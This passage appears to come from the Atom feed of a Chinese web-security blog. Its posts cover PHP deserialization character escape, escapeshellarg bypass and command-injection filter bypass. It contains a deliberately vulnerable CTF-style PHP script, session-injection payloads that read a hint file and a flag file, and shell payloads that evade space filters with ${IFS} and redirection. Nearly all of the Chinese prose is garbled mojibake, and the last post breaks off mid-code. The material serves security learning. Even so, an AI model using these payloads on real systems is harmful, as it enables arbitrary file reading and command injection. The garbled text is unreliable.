class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">'f'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = sha1(base64_encode($_GET[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ–¹æ³•å’Œä¸Šé¢çš„demo2ç±»ä¼¼ï¼Œè¿™é‡Œå°±ä¸å†é‡å¤äº†ï¼ŒåŸç†å°±æ˜¯åˆ©ç”¨è¿‡æ»¤ä¸ºç©ºè®©ååºåˆ—åŒ–ä¼šè‡ªåŠ¨å¾€åè¯»å–ï¼Œç„¶åå¯ä»¥å¯¹<code>$_SESSION[&#39;img&#39;]</code>è¿›è¡Œæ§åˆ¶ï¼Œè¿›è€Œå¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–</p><p>payloadï¼š</p><p>è¯»å–hintæç¤º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=fl1gfl1gfl1gfl1gfl1gfl1g&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>"</span>;s:<span class="number">3</span>:<span class="string">"img"</span>;s:<span class="number">20</span>:<span class="string">"ZDBnM19mMWFnLnBocA=="</span>;s:<span class="number">3</span>:<span class="string">"aaa"</span>;s:<span class="number">2</span>:<span class="string">"no"</span>;&#125;&amp;<span class="function"><span class="keyword">function</span>=<span class="title">show_image</span></span></span><br></pre></td></tr></table></figure><p>è¯»å–flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=fl1gfl1gfl1gfl1gfl1gfl1g&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>"</span>;s:<span class="number">3</span>:<span class="string">"img"</span>;s:<span class="number">20</span>:<span class="string">"L2QwZzNfZmxsbGxsbGFn"</span>;s:<span class="number">3</span>:<span class="string">"aaa"</span>;s:<span class="number">2</span>:<span class="string">"no"</span>;&#125;&amp;<span class="function"><span class="keyword">function</span>=<span class="title">show_image</span></span></span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol><li><a href="https://www.cnblogs.com/wfzWebSecuity/p/11876441.html" target="_blank" rel="noopener">PHPå­—ç¬¦é€ƒé€¸å¯¼è‡´çš„å¯¹è±¡æ³¨å…¥</a></li><li><a href="https://www.cnblogs.com/peri0d/p/11845917.html" target="_blank" rel="noopener">è¯¦è§£PHPååºåˆ—åŒ–ä¸­çš„å­—ç¬¦é€ƒé€¸</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;phpååºåˆ—åŒ–ä¸­çš„å¯¹è±¡é€ƒé€¸çš„å­¦ä¹ &lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>phpä¸­escapeshellargå’Œescapeshellcmdçš„ç»•è¿‡</title>
    <link href="http://0clickjacking0.github.io/2019/12/13/php%E4%B8%ADescapeshellarg%E5%92%8Cescapeshellcmd%E7%9A%84%E7%BB%95%E8%BF%87/"/>
    <id>http://0clickjacking0.github.io/2019/12/13/phpä¸­escapeshellargå’Œescapeshellcmdçš„ç»•è¿‡/</id>
    <published>2019-12-13T12:03:44.000Z</published>
    <updated>2019-12-13T13:04:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>phpä¸­escapeshellargå’Œescapeshellcmdçš„ç»•è¿‡çš„å­¦ä¹ </p><a id="more"></a><h1 id="çŸ¥è¯†é“ºå«"><a href="#çŸ¥è¯†é“ºå«" class="headerlink" title="çŸ¥è¯†é“ºå«"></a>çŸ¥è¯†é“ºå«</h1>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;phpä¸­escapeshellargå’Œescapeshellcmdçš„ç»•è¿‡çš„å­¦ä¹ &lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>å‘½ä»¤æ‰§è¡Œbypassçš„æ€»ç»“</title>
    <link href="http://0clickjacking0.github.io/2019/12/11/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cbypass%E7%9A%84%E6%80%BB%E7%BB%93/"/>
    <id>http://0clickjacking0.github.io/2019/12/11/å‘½ä»¤æ‰§è¡Œbypassçš„æ€»ç»“/</id>
    <published>2019-12-11T02:17:37.000Z</published>
    <updated>2020-01-12T11:24:08.436Z</updated>
    
    <content type="html"><![CDATA[<p>å‘½ä»¤æ‰§è¡Œbypassçš„æ€»ç»“</p><a id="more"></a><h1 id="å…³äºæ–‡ä»¶è¯»å–çš„å‘½ä»¤"><a href="#å…³äºæ–‡ä»¶è¯»å–çš„å‘½ä»¤" class="headerlink" title="å…³äºæ–‡ä»¶è¯»å–çš„å‘½ä»¤"></a>å…³äºæ–‡ä»¶è¯»å–çš„å‘½ä»¤</h1><h2 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h2><p><strong>catå‘½ä»¤</strong>è¿æ¥æ–‡ä»¶å¹¶æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ä¸Šï¼Œcatç»å¸¸ç”¨æ¥æ˜¾ç¤ºæ–‡ä»¶çš„å†…å®¹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># cat 1.txt</span></span><br><span class="line">123456</span><br><span class="line">555</span><br><span class="line">666</span><br></pre></td></tr></table></figure><h2 id="tac"><a href="#tac" class="headerlink" title="tac"></a>tac</h2><p><strong>tacå‘½ä»¤</strong>ç”¨äºå°†æ–‡ä»¶å·²è¡Œä¸ºå•ä½çš„ååºè¾“å‡ºï¼Œå³ç¬¬ä¸€è¡Œæœ€åæ˜¾ç¤ºï¼Œæœ€åä¸€è¡Œå…ˆæ˜¾ç¤ºã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># tac 1.txt</span></span><br><span class="line">666</span><br><span class="line">555</span><br><span class="line">123456</span><br></pre></td></tr></table></figure><h2 id="head"><a href="#head" class="headerlink" title="head"></a>head</h2><p><strong>headå‘½ä»¤</strong>ç”¨äºæ˜¾ç¤ºæ–‡ä»¶çš„å¼€å¤´çš„å†…å®¹ã€‚åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œheadå‘½ä»¤æ˜¾ç¤ºæ–‡ä»¶çš„å¤´10è¡Œå†…å®¹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># head 1.txt</span></span><br><span class="line">123456</span><br><span class="line">555</span><br><span class="line">666</span><br></pre></td></tr></table></figure><h2 id="tail"><a href="#tail" class="headerlink" title="tail"></a>tail</h2><p><strong>tailå‘½ä»¤</strong>ç”¨äºè¾“å…¥æ–‡ä»¶ä¸­çš„å°¾éƒ¨å†…å®¹ã€‚tailå‘½ä»¤é»˜è®¤åœ¨å±å¹•ä¸Šæ˜¾ç¤ºæŒ‡å®šæ–‡ä»¶çš„æœ«å°¾10è¡Œã€‚å¦‚æœç»™å®šçš„æ–‡ä»¶ä¸æ­¢ä¸€ä¸ªï¼Œåˆ™åœ¨æ˜¾ç¤ºçš„æ¯ä¸ªæ–‡ä»¶å‰é¢åŠ ä¸€ä¸ªæ–‡ä»¶åæ ‡é¢˜ã€‚å¦‚æœæ²¡æœ‰æŒ‡å®šæ–‡ä»¶æˆ–è€…æ–‡ä»¶åä¸ºâ€œ-â€ï¼Œåˆ™è¯»å–æ ‡å‡†è¾“å…¥ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># tail 1.txt</span></span><br><span class="line">123456</span><br><span class="line">555</span><br><span class="line">666</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@c6017a98836f:/var<span class="comment"># tail 1.txt 2.txt</span></span><br><span class="line">==&gt; 1.txt &lt;==</span><br><span class="line">123456</span><br><span class="line">555</span><br><span class="line">666</span><br><span class="line"></span><br><span class="line">==&gt; 2.txt &lt;==</span><br><span class="line">aaa</span><br><span class="line">bbb</span><br></pre></td></tr></table></figure><h2 id="more"><a href="#more" class="headerlink" title="more"></a>more</h2><p><strong>moreå‘½ä»¤</strong>æ˜¯ä¸€ä¸ªåŸºäºviç¼–è¾‘å™¨æ–‡æœ¬è¿‡æ»¤å™¨ï¼Œå®ƒä»¥å…¨å±å¹•çš„æ–¹å¼æŒ‰é¡µæ˜¾ç¤ºæ–‡æœ¬æ–‡ä»¶çš„å†…å®¹ï¼Œæ”¯æŒviä¸­çš„å…³é”®å­—å®šä½æ“ä½œã€‚moreåå•ä¸­å†…ç½®äº†è‹¥å¹²å¿«æ·é”®ï¼Œå¸¸ç”¨çš„æœ‰Hï¼ˆè·å¾—å¸®åŠ©ä¿¡æ¯ï¼‰ï¼ŒEnterï¼ˆå‘ä¸‹ç¿»æ»šä¸€è¡Œï¼‰ï¼Œç©ºæ ¼ï¼ˆå‘ä¸‹æ»šåŠ¨ä¸€å±ï¼‰ï¼ŒQï¼ˆé€€å‡ºå‘½ä»¤ï¼‰ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># more 1.txt</span></span><br><span class="line">123456</span><br><span class="line">555</span><br><span class="line">666</span><br></pre></td></tr></table></figure><h2 id="less-åœ¨dockerä¸­å¯èƒ½ä¸å­˜åœ¨è¿™ä¸ªå‘½ä»¤"><a href="#less-åœ¨dockerä¸­å¯èƒ½ä¸å­˜åœ¨è¿™ä¸ªå‘½ä»¤" class="headerlink" title="less(åœ¨dockerä¸­å¯èƒ½ä¸å­˜åœ¨è¿™ä¸ªå‘½ä»¤)"></a>less(åœ¨dockerä¸­å¯èƒ½ä¸å­˜åœ¨è¿™ä¸ªå‘½ä»¤)</h2><p><strong>lesså‘½ä»¤</strong>çš„ä½œç”¨ä¸<a href="http://man.linuxde.net/more" target="_blank" rel="noopener">more</a>ååˆ†ç›¸ä¼¼ï¼Œéƒ½å¯ä»¥ç”¨æ¥æµè§ˆæ–‡å­—æ¡£æ¡ˆçš„å†…å®¹ï¼Œä¸åŒçš„æ˜¯lesså‘½ä»¤å…è®¸ç”¨æˆ·å‘å‰æˆ–å‘åæµè§ˆæ–‡ä»¶ï¼Œè€Œmoreå‘½ä»¤åªèƒ½å‘å‰æµè§ˆã€‚ç”¨lesså‘½ä»¤æ˜¾ç¤ºæ–‡ä»¶æ—¶ï¼Œç”¨PageUpé”®å‘ä¸Šç¿»é¡µï¼Œç”¨PageDowné”®å‘ä¸‹ç¿»é¡µã€‚è¦é€€å‡ºlessç¨‹åºï¼Œåº”æŒ‰Qé”®ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">less 1.txt</span><br><span class="line"></span><br><span class="line">123456</span><br><span class="line">555</span><br><span class="line">666</span><br></pre></td></tr></table></figure><h2 id="nl"><a href="#nl" class="headerlink" title="nl"></a>nl</h2><p><strong>nlå‘½ä»¤</strong>è¯»å– <a href="http://man.linuxde.net/file" target="_blank" rel="noopener">file</a> å‚æ•°ï¼ˆç¼ºçœæƒ…å†µä¸‹æ ‡å‡†è¾“å…¥ï¼‰ï¼Œè®¡ç®—è¾“å…¥ä¸­çš„è¡Œå·ï¼Œå°†è®¡ç®—è¿‡çš„è¡Œå·å†™å…¥æ ‡å‡†è¾“å‡ºã€‚åœ¨è¾“å‡ºä¸­ï¼Œnlå‘½ä»¤æ ¹æ®æ‚¨åœ¨å‘½ä»¤è¡Œä¸­æŒ‡å®šçš„æ ‡å¿—æ¥è®¡ç®—å·¦è¾¹çš„è¡Œã€‚è¾“å…¥æ–‡æœ¬å¿…é¡»å†™åœ¨é€»è¾‘é¡µä¸­ã€‚æ¯ä¸ªé€»è¾‘é¡µæœ‰å¤´ã€ä¸»ä½“å’Œé¡µè„šèŠ‚ï¼ˆå¯ä»¥æœ‰ç©ºèŠ‚ï¼‰ã€‚é™¤éä½¿ç”¨<code>-p</code>é€‰é¡¹ï¼Œnl å‘½ä»¤åœ¨æ¯ä¸ªé€»è¾‘é¡µå¼€å§‹çš„åœ°æ–¹é‡æ–°è®¾ç½®è¡Œå·ã€‚å¯ä»¥å•ç‹¬ä¸ºå¤´ã€ä¸»ä½“å’Œé¡µè„šèŠ‚è®¾ç½®è¡Œè®¡ç®—æ ‡å¿—ï¼ˆä¾‹å¦‚ï¼Œå¤´å’Œé¡µè„šè¡Œå¯ä»¥è¢«è®¡ç®—ç„¶è€Œæ–‡æœ¬è¡Œä¸èƒ½ï¼‰ã€‚å…¶é»˜è®¤çš„ç»“æœä¸<code>cat -n</code>æœ‰ç‚¹ä¸å¤ªä¸€æ ·ï¼Œ nl å¯ä»¥å°†è¡Œå·åšæ¯”è¾ƒå¤šçš„æ˜¾ç¤ºè®¾è®¡ï¼ŒåŒ…æ‹¬ä½æ•°ä¸æ˜¯å¦è‡ªåŠ¨è¡¥é½0ç­‰ç­‰çš„åŠŸèƒ½ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># nl 1.txt</span></span><br><span class="line">     1123456</span><br><span class="line">     2555</span><br><span class="line">     3666</span><br></pre></td></tr></table></figure><h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p>ä»æŒ‡å®šçš„æ–‡ä»¶fileä¸­è¯»å–æ•°æ®ï¼Œç¼–ç ä¸ºbase64å­—ç¬¦ä¸²è¾“å‡ºã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># base64 1.txt</span></span><br><span class="line">MTIzNDU2CjU1NQo2NjYK</span><br></pre></td></tr></table></figure><h2 id="base32"><a href="#base32" class="headerlink" title="base32"></a>base32</h2><p>ä»æŒ‡å®šçš„æ–‡ä»¶fileä¸­è¯»å–æ•°æ®ï¼Œç¼–ç ä¸ºbase32å­—ç¬¦ä¸²è¾“å‡ºã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># base32 1.txt</span></span><br><span class="line">GEZDGNBVGYFDKNJVBI3DMNQK</span><br></pre></td></tr></table></figure><h2 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h2><p><strong>stringså‘½ä»¤</strong>åœ¨å¯¹è±¡æ–‡ä»¶æˆ–äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æŸ¥æ‰¾å¯æ‰“å°çš„å­—ç¬¦ä¸²ã€‚å­—ç¬¦ä¸²æ˜¯4ä¸ªæˆ–æ›´å¤šå¯æ‰“å°å­—ç¬¦çš„ä»»æ„åºåˆ—ï¼Œä»¥æ¢è¡Œç¬¦æˆ–ç©ºå­—ç¬¦ç»“æŸã€‚ stringså‘½ä»¤å¯¹è¯†åˆ«éšæœºå¯¹è±¡æ–‡ä»¶å¾ˆæœ‰ç”¨ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># strings 1.txt</span></span><br><span class="line">123456</span><br></pre></td></tr></table></figure><h2 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h2><p><strong>sortå‘½ä»¤</strong>æ˜¯åœ¨Linuxé‡Œéå¸¸æœ‰ç”¨ï¼Œå®ƒå°†æ–‡ä»¶è¿›è¡Œæ’åºï¼Œå¹¶å°†æ’åºç»“æœæ ‡å‡†è¾“å‡ºã€‚sortå‘½ä»¤æ—¢å¯ä»¥ä»ç‰¹å®šçš„æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ä»stdinä¸­è·å–è¾“å…¥ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@9423a7551563:/<span class="comment"># sort 1.txt</span></span><br><span class="line">123</span><br><span class="line">456</span><br></pre></td></tr></table></figure><h2 id="rev"><a href="#rev" class="headerlink" title="rev"></a>rev</h2><p>æ¯è¡Œéƒ½å€’åºè¾“å‡º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-16-ubuntu:~$ rev 1.php</span><br><span class="line">.atad fo setyb )48(65 )1.0.0.721( 1.0.0.721 GNIP</span><br><span class="line">sm 340.0=emit 46=ltt 1=qes_pmci :1.0.0.721 morf setyb 46</span><br><span class="line">sm 140.0=emit 46=ltt 2=qes_pmci :1.0.0.721 morf setyb 46</span><br></pre></td></tr></table></figure><h2 id="od"><a href="#od" class="headerlink" title="od"></a>od</h2><p><strong>odå‘½ä»¤</strong>ç”¨äºè¾“å‡ºæ–‡ä»¶çš„å…«è¿›åˆ¶ã€åå…­è¿›åˆ¶æˆ–å…¶å®ƒæ ¼å¼ç¼–ç çš„å­—èŠ‚ï¼Œé€šå¸¸ç”¨äºæ˜¾ç¤ºæˆ–æŸ¥çœ‹æ–‡ä»¶ä¸­ä¸èƒ½ç›´æ¥æ˜¾ç¤ºåœ¨ç»ˆç«¯çš„å­—ç¬¦ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># od 1.txt</span></span><br><span class="line">0000000 031061 032063 033065 032412 032465 033012 033066 000012</span><br><span class="line">0000017</span><br></pre></td></tr></table></figure><h2 id="cut"><a href="#cut" class="headerlink" title="cut"></a>cut</h2><p><strong>cutå‘½ä»¤</strong>ç”¨æ¥æ˜¾ç¤ºè¡Œä¸­çš„æŒ‡å®šéƒ¨åˆ†ï¼Œåˆ é™¤æ–‡ä»¶ä¸­æŒ‡å®šå­—æ®µã€‚cutç»å¸¸ç”¨æ¥æ˜¾ç¤ºæ–‡ä»¶çš„å†…å®¹ï¼Œç±»ä¼¼äºä¸‹çš„<a href="http://man.linuxde.net/type" target="_blank" rel="noopener">type</a>å‘½ä»¤ã€‚</p><h3 id="cuté€‰é¡¹è¯´æ˜ï¼š"><a href="#cuté€‰é¡¹è¯´æ˜ï¼š" class="headerlink" title="cuté€‰é¡¹è¯´æ˜ï¼š"></a>cuté€‰é¡¹è¯´æ˜ï¼š</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">é€‰é¡¹-bï¼Œä»¥å­—èŠ‚ä¸ºå•ä½è¿›è¡Œåˆ†å‰²ï¼Œ-bæ”¯æŒå½¢å¦‚3-5çš„å†™æ³•ï¼Œè€Œä¸”å¤šä¸ªå®šä½ä¹‹é—´ç”¨é€—å·éš”å¼€å°±æˆäº†,æ¯”å¦‚æƒ³æå–ç¬¬3ï¼Œç¬¬4ã€ç¬¬5å’Œç¬¬8ä¸ªå­—èŠ‚ï¼Œå‘½ä»¤ä¸º -b 3-5,8</span><br><span class="line"></span><br><span class="line">é€‰é¡¹-cï¼Œä»¥å­—ç¬¦ä¸ºå•ä½è¿›è¡Œåˆ†å‰²ã€‚ç”¨æ³•ä¸-bç±»ä¼¼</span><br><span class="line"></span><br><span class="line">é€‰é¡¹-fï¼Œåé¢è·Ÿåˆ—å·ï¼Œæ¯”å¦‚-f 1ï¼Œè¡¨ç¤ºè¯»å–ç¬¬ä¸€åˆ—çš„ä¿¡æ¯</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># cut -b 1-30 /flag</span></span><br><span class="line">huctf&#123;put_1s_a_900d_wa7&#125;</span><br><span class="line"></span><br><span class="line">root@c6017a98836f:/var<span class="comment"># cut -f 1 /flag</span></span><br><span class="line">huctf&#123;put_1s_a_900d_wa7&#125;</span><br><span class="line"></span><br><span class="line">root@c6017a98836f:/var<span class="comment"># cut -c 1-30 /flag</span></span><br><span class="line">huctf&#123;put_1s_a_900d_wa7&#125;</span><br></pre></td></tr></table></figure><h2 id="hexdump-åœ¨dockerä¸­å¯èƒ½ä¸å­˜åœ¨è¿™ä¸ªå‘½ä»¤"><a href="#hexdump-åœ¨dockerä¸­å¯èƒ½ä¸å­˜åœ¨è¿™ä¸ªå‘½ä»¤" class="headerlink" title="hexdump(åœ¨dockerä¸­å¯èƒ½ä¸å­˜åœ¨è¿™ä¸ªå‘½ä»¤)"></a>hexdump(åœ¨dockerä¸­å¯èƒ½ä¸å­˜åœ¨è¿™ä¸ªå‘½ä»¤)</h2><p><strong>hexdumpå‘½ä»¤</strong>ä¸€èˆ¬ç”¨æ¥æŸ¥çœ‹â€œäºŒè¿›åˆ¶â€æ–‡ä»¶çš„åå…­è¿›åˆ¶ç¼–ç ï¼Œä½†å®é™…ä¸Šå®ƒèƒ½æŸ¥çœ‹ä»»ä½•æ–‡ä»¶ï¼Œè€Œä¸åªé™äºäºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-16-ubuntu:~$ hexdump 1.txt</span><br><span class="line">0000000 6568 6c6c 206f 6978 6e61 7579 3231 2133</span><br><span class="line">0000010 000a</span><br><span class="line">0000011</span><br></pre></td></tr></table></figure><h2 id="xxd-åœ¨dockerä¸­å¯èƒ½ä¸å­˜åœ¨è¿™ä¸ªå‘½ä»¤"><a href="#xxd-åœ¨dockerä¸­å¯èƒ½ä¸å­˜åœ¨è¿™ä¸ªå‘½ä»¤" class="headerlink" title="xxd(åœ¨dockerä¸­å¯èƒ½ä¸å­˜åœ¨è¿™ä¸ªå‘½ä»¤)"></a>xxd(åœ¨dockerä¸­å¯èƒ½ä¸å­˜åœ¨è¿™ä¸ªå‘½ä»¤)</h2><p><strong>xxdèƒ½å°†ä¸€ä¸ªç»™å®šæ–‡ä»¶æˆ–æ ‡å‡†è¾“å…¥è½¬æ¢ä¸ºåå…­è¿›åˆ¶å½¢å¼ï¼Œä¹Ÿèƒ½å°†åå…­è¿›åˆ¶è½¬æ¢å›äºŒè¿›åˆ¶å½¢å¼ã€‚</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-16-ubuntu:~$ xxd 1.txt</span><br><span class="line">00000000: 6865 6c6c 6f20 7869 616e 7975 3132 3321  hello xianyu123!</span><br><span class="line">00000010: 0a</span><br></pre></td></tr></table></figure><h1 id="ç©ºæ ¼è¿‡æ»¤"><a href="#ç©ºæ ¼è¿‡æ»¤" class="headerlink" title="ç©ºæ ¼è¿‡æ»¤"></a>ç©ºæ ¼è¿‡æ»¤</h1><h2 id="æ–¹æ³•1ï¼š-IFS"><a href="#æ–¹æ³•1ï¼š-IFS" class="headerlink" title="æ–¹æ³•1ï¼š${IFS}"></a>æ–¹æ³•1ï¼š${IFS}</h2><p>payload1:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-16-ubuntu:~$ ls<span class="variable">$&#123;IFS&#125;</span>/home</span><br><span class="line">ubuntu</span><br></pre></td></tr></table></figure><p>payload2:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-16-ubuntu:~$ ls<span class="variable">$IFS</span>/home</span><br><span class="line">ubuntu</span><br></pre></td></tr></table></figure><p>payload3:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-16-ubuntu:~$ ls<span class="variable">$IFS</span><span class="variable">$9</span>/home</span><br><span class="line">ubuntu</span><br></pre></td></tr></table></figure><h2 id="æ–¹æ³•2ï¼šé‡å®šå‘ç¬¦-lt-gt"><a href="#æ–¹æ³•2ï¼šé‡å®šå‘ç¬¦-lt-gt" class="headerlink" title="æ–¹æ³•2ï¼šé‡å®šå‘ç¬¦&lt;&gt;"></a>æ–¹æ³•2ï¼šé‡å®šå‘ç¬¦&lt;&gt;</h2><p>payload1:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># cat&lt;&gt;1.txt</span></span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure><p>payload2:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span 